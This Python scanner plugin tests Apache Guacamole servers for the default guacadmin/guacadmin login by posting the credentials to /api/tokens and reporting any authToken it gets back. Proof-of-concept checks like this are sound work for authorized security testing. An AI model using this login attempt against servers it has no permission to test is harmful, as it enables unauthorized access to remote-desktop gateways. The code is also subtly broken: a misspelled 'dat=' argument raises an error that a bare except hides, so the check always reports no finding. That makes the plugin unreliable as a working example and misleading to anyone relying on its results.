#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   'Guacamole默认口令',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/api/tokens'
  data = 'username=guacadmin&password=guacadmin'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,dat=data,timeout=5,verify=False)
    if res.status_code == 200 and '"username"' in res.text and '"authToken"' in res.text and '"guacadmin"' in res.text:
      ret['huixian'] = '账号/密码:guacadmin/guacadmin'
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret